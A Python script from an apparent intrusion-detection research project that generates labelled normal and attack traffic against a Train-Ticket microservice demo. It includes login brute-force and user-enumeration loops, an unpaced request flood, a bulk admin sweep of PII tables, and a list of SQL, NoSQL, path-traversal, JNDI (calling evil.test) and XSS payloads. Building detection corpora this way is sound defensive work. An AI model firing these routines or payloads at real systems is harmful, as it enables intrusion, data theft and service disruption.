#!/usr/bin/env python3
"""
generate_abuse_traffic.py — SecLogTrace Phase 2
REPO LOCATION: scripts/collection/generate_abuse_traffic.py

Corpus-grade labelled traffic for the three no-code-change attack classes,
wrapping the reused request/payload logic from the attack-ONLY demo
(generate_attack_traffic.py — the tooling that produced the contaminated
attack_demo_001) in the collection-discipline structure of the SSRF
template (generate_ssrf_traffic.py): --mode normal / attack / pilot, a 60s
pilot gap, per-sub-type labels, explicit pacing, and separate windows.

Each class is a CONTROLLED within-endpoint comparison — normal and attack
hit the SAME endpoint, differing only in input and/or timing, so the
confound that invalidated the earlier 82-vs-46 span finding is absent.

  credential_abuse (CWE-307)      POST /api/v1/users/login
      normal  successful, human-paced logins of the demo user
      attack  a burst of auth failures, two sub-types:
                cred_bruteforce  wrong passwords vs the REAL demo username
                cred_userenum    logins for non-existent usernames
      SIGNAL: Train-Ticket returns HTTP 200 + a body-level status flag on a
      bad login, NOT an error code — so status/error-rate features will NOT
      separate this class. The signal is request rate/timing and the
      auth-failure content in the logs.
      GOTCHA: never target admin/admin — that trips an injected app-level
      fault (INVALID_PASSWORD_LENGTH_FAULT). The demo user is safe.

  resource_exhaustion (CWE-400)   POST /api/v1/travelservice/trips/left
      normal  the SAME fixed query (nanjing->shanghai) at human pace
      attack  the SAME fixed query fired back-to-back with no gap (flood)
      SIGNAL: request RATE only. Both sides run the identical query so
      per-trace structure is held constant — the difference is temporal
      (inter-arrival time / requests-per-window), and any latency
      degradation under load. Do NOT expect a per-trace span-count gap;
      an earlier version that rotated the normal query while the attack
      used one fixed query manufactured exactly that (a selectivity
      artifact — the withdrawn 82-vs-46 confound). Fixed 2026-09-04.

  injection (CWE-89/943)          POST /api/v1/travelservice/trips/left
      normal  the SAME fixed valid query (nanjing->shanghai), same pacing
      attack  SQLi / NoSQLi / path-traversal / JNDI / XSS payloads in the
              startPlace field, sub-typed by family — PACED like normal
      SIGNAL: the malformed INPUT only (rate held constant, unlike the two
      rate classes). NOTE: Train-Ticket very likely parameterizes these —
      expect NO HTTP-level error; the detectable signal is the
      rejected/empty-input path (payload matches no station -> 0 results ->
      short trace) vs the valid query's full fan-out. Characterize honestly.

  data_exfiltration (CWE-200)     GET /api/v1/admin*service/* (bulk reads)
      normal  a legit admin reading routine operational dashboards
              (orders, travels) at human pace — never the PII tables
      attack  an admin-credentialed sweep of ALL sensitive tables incl. the
              PII ones (users, contacts), in a burst — sub-typed per table
      SIGNAL: (a) ACCESS to the PII endpoints (attack-only root operations),
      (b) BREADTH of distinct sensitive tables hit in the window, (c)
      VOLUME/RATE (large responses, burst). Needs admin creds (DEMO_ADMIN,
      222222 — never admin/admin). resp_bytes / record_count are logged so
      the data-volume signal is visible in the session log.

One class per invocation. Cross-class traffic in a single window would
break both the controlled within-endpoint comparison and the zero-leakage
audit, so each class is its own cleanly-windowed experiment. Run --mode
normal and --mode attack as SEPARATE, clearly-windowed sessions, export each
separately with explicit --start/--end, then:

    corpus_audit.py '<normal dir>/*.json' '<attack dir>/*.json' \
        --by-filename-label      # MUST report ZERO multi-label traces

--mode pilot runs 15 normal, a 60s gap, then 15 attack (two windows) for the
first small validation of a class, mirroring the SSRF pilot.

Usage:
    python3 generate_abuse_traffic.py --class credential_abuse --mode pilot
    python3 generate_abuse_traffic.py --class credential_abuse --mode normal --count 150
    python3 generate_abuse_traffic.py --class credential_abuse --mode attack --count 150
    (same for --class resource_exhaustion / --class injection)
    add --dry-run to print the request schedule WITHOUT calling the gateway
"""

import argparse
import json
import random
import string
import sys
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from ts_client import GATEWAY, DEMO_USER, DEMO_ADMIN, login  # noqa: E402
import requests  # noqa: E402

LOGIN_PATH = "/api/v1/users/login"
TRIP_SEARCH_PATH = "/api/v1/travelservice/trips/left"

# The ONE fixed legitimate query used by BOTH normal and attack for the
# trip-search classes (resource_exhaustion, injection). Using a single fixed
# pair — not a rotating set — is deliberate: it holds query selectivity
# constant so the only thing that varies between normal and attack is the
# variable that class is about (request RATE for resource_exhaustion, the
# malformed INPUT for injection). Rotating the normal pair while the attack
# used one fixed pair (an earlier version of this file) produced a span-count
# gap driven purely by how many trips each pair returns — exactly the
# workload confound that got the 82-vs-46 span finding withdrawn. Don't
# reintroduce it. nanjing->shanghai returns ~5 trips in this deployment
# (experiment_003/004), so the legit trace has real fan-out to contrast an
# empty/rejected one against.
PRIMARY_PAIR = ("nanjing", "shanghai")

# Kept for reference / possible future varied-workload use, but the trip
# classes now use PRIMARY_PAIR only (see above).
LEGIT_PAIRS = [
    ("nanjing", "shanghai"),
    ("shanghai", "nanjing"),
    ("taiyuan", "nanjing"),
    ("nanjing", "xuzhou"),
    ("xuzhou", "jinan"),
]

# (family_label, payload) — payload goes in the startPlace field of the trip
# search. Families let the per-sub-type (RQ3) analysis group by attack type,
# the same way SSRF's three targets do. Reused verbatim from the demo's
# INJECTION_PAYLOADS, now tagged by family.
INJECTION_PAYLOADS = [
    ("inj_sqli",     "shanghai' OR '1'='1"),
    ("inj_sqli",     "shanghai'; DROP TABLE station; --"),
    ("inj_sqli",     "shanghai' UNION SELECT * FROM user--"),
    ("inj_sqli",     "shanghai\" OR \"\"=\""),
    ("inj_nosqli",   "{\"$ne\": null}"),
    ("inj_pathtrav", "../../../../etc/passwd"),
    ("inj_jndi",     "shanghai${jndi:ldap://evil.test/a}"),
    ("inj_xss",      "<script>alert(1)</script>"),
]

# credential_abuse attack sub-type weights (relative, not counts). Brute
# force against the real user is the headline signature, so it dominates;
# user-enumeration still gets meaningful representation for the per-sub-type
# analysis. Mirrors SSRF_TARGETS' weighting.
CRED_WEIGHTS = [("cred_bruteforce", 3), ("cred_userenum", 1)]


def now_iso():
    return datetime.now(timezone.utc).isoformat()


def default_search_date():
    """A near-future date so the legitimate search returns real trips,
    computed at run time rather than hardcoded (a stale date returns 0
    results and makes the normal class structurally thin)."""
    return (datetime.now() + timedelta(days=3)).strftime("%Y-%m-%d 00:00:00")


def fire(method, path, body, class_label, log, dry, timeout=20, headers=None):
    """Send one request (or, under --dry-run, just record what would be
    sent) and append a structured entry to the session log. For GET reads
    pass body=None; `headers` carries the admin bearer token for the
    data_exfiltration class. Records response size (bytes / record count) so
    the exfiltration volume signal is visible in the session log."""
    entry = {"ts": now_iso(), "class_label": class_label, "method": method,
             "path": path}
    if dry:
        entry["dry_run"] = True
        entry["body"] = body
        log.append(entry)
        return entry
    t0 = time.time()
    try:
        r = requests.request(method, f"{GATEWAY}{path}", json=body,
                             headers=headers, timeout=timeout)
        entry["http_status"] = r.status_code
        entry["elapsed_s"] = round(time.time() - t0, 3)
        entry["resp_bytes"] = len(r.content)
        try:
            b = r.json()
            entry["resp_status"] = b.get("status")
            entry["msg_head"] = str(b.get("msg", ""))[:120]
            data = b.get("data")
            if isinstance(data, list):
                entry["record_count"] = len(data)
        except Exception:
            entry["body_raw"] = r.text[:120]
    except requests.RequestException as e:
        entry["error"] = str(e)
        entry["elapsed_s"] = round(time.time() - t0, 3)
    log.append(entry)
    return entry


def _report(i, count, e, label):
    detail = (f"status={e.get('http_status', 'DRY' if e.get('dry_run') else 'ERR')}")
    rs = e.get("resp_status")
    if rs is not None:
        detail += f" resp_status={rs}"
    if e.get("elapsed_s") is not None:
        detail += f" {e['elapsed_s']}s"
    print(f"  [{i + 1:>3}/{count}] {label:<16} {detail}")


def _weighted_schedule(weights, count):
    """Interleave sub-types by weight into a length-`count` list of labels.
    Same interleave-the-most-behind approach as generate_ssrf_traffic.py, so
    sub-types are spread through the window rather than blocked together."""
    total_w = sum(w for _, w in weights)
    quotas, allocated = [], 0
    for i, (label, w) in enumerate(weights):
        n = count - allocated if i == len(weights) - 1 else round(count * w / total_w)
        quotas.append([label, n])
        allocated += n
    taken = {q[0]: 0 for q in quotas}
    schedule = []
    for _ in range(count):
        cand = max((q for q in quotas if taken[q[0]] < q[1]),
                   key=lambda q: (q[1] - taken[q[0]]) / q[1] if q[1] else 0,
                   default=None)
        if cand is None:
            break
        schedule.append(cand[0])
        taken[cand[0]] += 1
    return schedule


# ---------------------------------------------------------------------------
# credential_abuse (CWE-307) — POST /api/v1/users/login
# ---------------------------------------------------------------------------

def cred_normal(count, pace, date, log, dry):
    print(f"NORMAL credential_abuse: {count} successful logins -> {LOGIN_PATH}")
    print("  (legitimate, human-paced auth of the demo user; resp_status=1)")
    body = {"username": DEMO_USER["username"], "password": DEMO_USER["password"]}
    for i in range(count):
        e = fire("POST", LOGIN_PATH, body, "normal", log, dry)
        _report(i, count, e, "login_success")
        time.sleep(pace)


def cred_attack(count, pace, date, log, dry):
    schedule = _weighted_schedule(CRED_WEIGHTS, count)
    print(f"ATTACK credential_abuse: {count} auth failures -> {LOGIN_PATH}")
    print("  sub-types: " + ", ".join(f"{lab}={schedule.count(lab)}"
                                       for lab, _ in CRED_WEIGHTS))
    print("  NOTE: bad logins return HTTP 200 + resp_status!=1, NOT an error "
          "code — timing/rate + log content is the signal, not status.")
    for i, sub in enumerate(schedule):
        if sub == "cred_bruteforce":
            body = {"username": DEMO_USER["username"], "password": f"wrongpass{i}"}
        else:  # cred_userenum
            rand = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
            body = {"username": f"nouser_{rand}", "password": "Passw0rd!"}
        e = fire("POST", LOGIN_PATH, body, sub, log, dry)
        _report(i, count, e, sub)
        time.sleep(pace)


# ---------------------------------------------------------------------------
# resource_exhaustion (CWE-400) — POST /api/v1/travelservice/trips/left
# ---------------------------------------------------------------------------

def _trip_search_body(start, end, date):
    return {"startPlace": start, "endPlace": end, "departureTime": date}


def rex_normal(count, pace, date, log, dry):
    print(f"NORMAL resource_exhaustion: {count} human-paced searches -> {TRIP_SEARCH_PATH}")
    print(f"  (the SAME query as attack — {PRIMARY_PAIR[0]}->{PRIMARY_PAIR[1]} — "
          f"so only the RATE differs, not per-trace structure)")
    start, end = PRIMARY_PAIR
    body = _trip_search_body(start, end, date)
    for i in range(count):
        e = fire("POST", TRIP_SEARCH_PATH, body, "normal", log, dry)
        _report(i, count, e, "search")
        time.sleep(pace)


def rex_attack(count, pace, date, log, dry):
    print(f"ATTACK resource_exhaustion: {count} unpaced burst searches -> {TRIP_SEARCH_PATH}")
    print(f"  (same query as normal, fired back-to-back; pace={pace}s is the "
          f"flood signature — per-trace structure should match normal)")
    start, end = PRIMARY_PAIR
    body = _trip_search_body(start, end, date)
    t0 = time.time()
    for i in range(count):
        e = fire("POST", TRIP_SEARCH_PATH, body, "resource_flood", log, dry)
        _report(i, count, e, "resource_flood")
        if pace:
            time.sleep(pace)
    elapsed = max(time.time() - t0, 0.01)
    print(f"  burst complete: {count} requests in {elapsed:.2f}s "
          f"({count / elapsed:.1f} req/s)")


# ---------------------------------------------------------------------------
# injection (CWE-89/943) — POST /api/v1/travelservice/trips/left
# ---------------------------------------------------------------------------

def inj_normal(count, pace, date, log, dry):
    print(f"NORMAL injection: {count} legitimate-station searches -> {TRIP_SEARCH_PATH}")
    print(f"  (the SAME query/pacing as attack, valid station "
          f"{PRIMARY_PAIR[0]} in startPlace — only the INPUT differs)")
    start, end = PRIMARY_PAIR
    body = _trip_search_body(start, end, date)
    for i in range(count):
        e = fire("POST", TRIP_SEARCH_PATH, body, "normal", log, dry)
        _report(i, count, e, "search")
        time.sleep(pace)


def inj_attack(count, pace, date, log, dry):
    print(f"ATTACK injection: {count} malformed-station searches -> {TRIP_SEARCH_PATH}")
    print(f"  (paced like normal, endPlace={PRIMARY_PAIR[1]}; the PAYLOAD in "
          f"startPlace is the only difference, not rate)")
    fams = {}
    for fam, _ in INJECTION_PAYLOADS:
        fams[fam] = 0
    print("  payload families: " + ", ".join(sorted(fams)))
    print("  NOTE: expect HTTP 200 with 0 results (queries are likely "
          "parameterized) — the signal is the request pattern, not an error.")
    for i in range(count):
        fam, payload = INJECTION_PAYLOADS[i % len(INJECTION_PAYLOADS)]
        body = _trip_search_body(payload, PRIMARY_PAIR[1], date)
        e = fire("POST", TRIP_SEARCH_PATH, body, fam, log, dry)
        _report(i, count, e, fam)
        time.sleep(pace)


# ---------------------------------------------------------------------------
# data_exfiltration (CWE-200) — bulk admin-read sweep of sensitive tables
# ---------------------------------------------------------------------------
# The admin bulk-read endpoints return WHOLE tables (verified 2026-09-04:
# adminuserservice/users -> 69 user records incl. PII; adminorder -> 65
# orders; adminbasic/contacts -> 66 contacts incl. names/doc-nums/phones;
# admintravel -> 16). All require an admin bearer token (403 without one).
#
# THREAT MODEL: an actor with (compromised) admin credentials harvesting the
# dataset. Normal = a legitimate admin viewing routine OPERATIONAL dashboards
# (orders, travels) occasionally. Attack = sweeping ALL sensitive tables —
# crucially the PII ones (users, contacts) that routine ops never touch — in
# a rapid burst. So the exfil signature is (a) ACCESS to the PII endpoints
# (attack-only root operations, like SSRF's targets), (b) BREADTH — how many
# distinct sensitive tables are hit in the window, and (c) VOLUME/RATE — a
# burst pulling large responses. The shared endpoints (orders, travels)
# appear in both classes for a within-endpoint comparison; the PII endpoints
# are attack-only. Uses DEMO_ADMIN (admin/222222) — SAFE; never admin/admin
# (that trips INVALID_PASSWORD_LENGTH_FAULT).
EXFIL_OPS_ENDPOINTS = [                       # routine admin dashboards (both classes)
    ("exfil_orders",   "/api/v1/adminorderservice/adminorder"),
    ("exfil_travels",  "/api/v1/admintravelservice/admintravel"),
]
EXFIL_PII_ENDPOINTS = [                       # sensitive PII tables (attack-only)
    ("exfil_users",    "/api/v1/adminuserservice/users"),
    ("exfil_contacts", "/api/v1/adminbasicservice/adminbasic/contacts"),
]
NORMAL_EXFIL = EXFIL_OPS_ENDPOINTS
ATTACK_EXFIL = EXFIL_OPS_ENDPOINTS + EXFIL_PII_ENDPOINTS

_ADMIN = {"headers": None}


def _admin_headers(dry):
    """Log in as admin once and cache the bearer header. Returns {} under
    --dry-run so no gateway call is made."""
    if dry:
        return {}
    if _ADMIN["headers"] is None:
        s = login(DEMO_ADMIN["username"], DEMO_ADMIN["password"])
        _ADMIN["headers"] = {"Authorization": f"Bearer {s.token}"}
    return _ADMIN["headers"]


def dexfil_normal(count, pace, date, log, dry):
    print(f"NORMAL data_exfiltration: {count} routine admin dashboard reads")
    print("  (operational endpoints only — orders, travels — human-paced; "
          "NEVER the PII tables)")
    hdr = _admin_headers(dry)
    for i in range(count):
        sub, path = NORMAL_EXFIL[i % len(NORMAL_EXFIL)]
        e = fire("GET", path, None, "normal", log, dry, headers=hdr)
        _report(i, count, e, sub)
        time.sleep(pace)


def dexfil_attack(count, pace, date, log, dry):
    print(f"ATTACK data_exfiltration: {count} bulk reads sweeping ALL sensitive tables")
    print("  (orders + travels + USERS + CONTACTS incl. PII, burst — the "
          "PII endpoints + breadth + rate are the exfil signal)")
    hdr = _admin_headers(dry)
    for i in range(count):
        sub, path = ATTACK_EXFIL[i % len(ATTACK_EXFIL)]
        e = fire("GET", path, None, sub, log, dry, headers=hdr)
        _report(i, count, e, sub)
        time.sleep(pace)


CLASSES = {
    "credential_abuse":    (cred_normal, cred_attack, LOGIN_PATH, "CWE-307"),
    "resource_exhaustion": (rex_normal, rex_attack, TRIP_SEARCH_PATH, "CWE-400"),
    "injection":           (inj_normal, inj_attack, TRIP_SEARCH_PATH, "CWE-89/943"),
    "data_exfiltration":   (dexfil_normal, dexfil_attack,
                            "GET /api/v1/admin*service/* (bulk reads)", "CWE-200"),
}

# Default ATTACK-side pacing per class. The pacing gap is part of the
# signature for the RATE-based classes (credential brute-force, resource
# flood) — those burst at 0s. Injection is NOT a rate attack: its signal is
# the malformed payload, so it is paced exactly like its normal class (2s)
# to hold rate constant and isolate the input. Normal is always 2s (human).
# --pace overrides both sides for any class.
ATTACK_PACE = {"credential_abuse": 0.0, "resource_exhaustion": 0.0,
               "injection": 2.0, "data_exfiltration": 0.0}


def write_log(log, out_path):
    Path(out_path).parent.mkdir(parents=True, exist_ok=True)
    with open(out_path, "w") as fh:
        for e in log:
            fh.write(json.dumps(e) + "\n")
    print(f"Session log written: {out_path}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--class", dest="cls", required=True, choices=sorted(CLASSES))
    ap.add_argument("--mode", required=True, choices=["normal", "attack", "pilot"])
    ap.add_argument("--count", type=int, default=30,
                    help="requests per class window (pilot always uses 15)")
    ap.add_argument("--pace", type=float, default=None,
                    help="seconds between requests. Default: normal=2.0 "
                         "(human); attack=0.0 for the rate classes "
                         "(credential_abuse, resource_exhaustion), 2.0 for "
                         "injection (payload is the signal, not rate). "
                         "Overrides both sides for any class.")
    ap.add_argument("--search-date", default=None,
                    help="YYYY-MM-DD HH:MM:SS for trip searches "
                         "(default: today+3 days, so legit searches return trips)")
    ap.add_argument("--out", default=None)
    ap.add_argument("--dry-run", action="store_true",
                    help="print the request schedule without calling the gateway")
    a = ap.parse_args()

    normal_fn, attack_fn, endpoint, cwe = CLASSES[a.cls]
    date = a.search_date or default_search_date()
    normal_pace = a.pace if a.pace is not None else 2.0
    attack_pace = a.pace if a.pace is not None else ATTACK_PACE[a.cls]

    if a.mode in ("normal", "attack") and a.count < 30 and not a.dry_run:
        print(f"NOTE: --count {a.count} is small for a corpus window. The "
              f"pilot uses 15/class; scaling targets ~150+/class. Proceeding.")

    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    print(f"Class: {a.cls} ({cwe})   Endpoint: {endpoint}")
    if a.cls in ("resource_exhaustion", "injection"):
        print(f"Search date: {date}")
    print(f"Session start: {now_iso()}"
          + ("   [DRY RUN — no requests sent]" if a.dry_run else "") + "\n")

    if a.mode == "pilot":
        nlog, slog = [], []
        print("=== PILOT: 15 normal, 60s gap, 15 attack ===\n")
        normal_fn(15, normal_pace, date, nlog, a.dry_run)
        npath = a.out or f"data/raw/traffic/{a.cls}_pilot_normal_{stamp}.jsonl"
        write_log(nlog, npath)
        if not a.dry_run:
            print("\n--- 60s gap to keep the export windows separable ---")
            gap_end = time.time() + 60
            while time.time() < gap_end:
                time.sleep(5)
        print()
        attack_fn(15, attack_pace, date, slog, a.dry_run)
        spath = a.out and (a.out + ".attack") or \
            f"data/raw/traffic/{a.cls}_pilot_attack_{stamp}.jsonl"
        write_log(slog, spath)
        print(f"\nSession end: {now_iso()}")
        print("\nTwo windows logged. Export each separately with explicit")
        print("--start/--end from the timestamps in each .jsonl:")
        print(f"  export_jaeger_traces.sh --label normal --experiment {a.cls}_pilot \\")
        print("      --start <normal start> --end <normal end> --limit 20000")
        print(f"  export_jaeger_traces.sh --label attack --experiment {a.cls}_pilot \\")
        print("      --start <attack start> --end <attack end> --limit 20000")
        print("Then corpus_audit.py '<both dirs>/*.json' --by-filename-label")
        print("(the 60s gap guarantees zero multi-label traces if the export")
        print("windows respect each logged start/end).")
        return

    log = []
    pace = normal_pace if a.mode == "normal" else attack_pace
    fn = normal_fn if a.mode == "normal" else attack_fn
    fn(a.count, pace, date, log, a.dry_run)
    out = a.out or f"data/raw/traffic/{a.cls}_{a.mode}_{stamp}.jsonl"
    write_log(log, out)
    print(f"Session end: {now_iso()}")
    print(f"\nNext: export the Jaeger window matching this session with "
          f"--label {a.mode}, then corpus_audit.py --by-filename-label.")


if __name__ == "__main__":
    if "-h" not in sys.argv and "--help" not in sys.argv and "--dry-run" not in sys.argv:
        try:
            import requests  # noqa
        except ImportError:
            sys.exit("requests not installed: pip install --user requests")
    main()
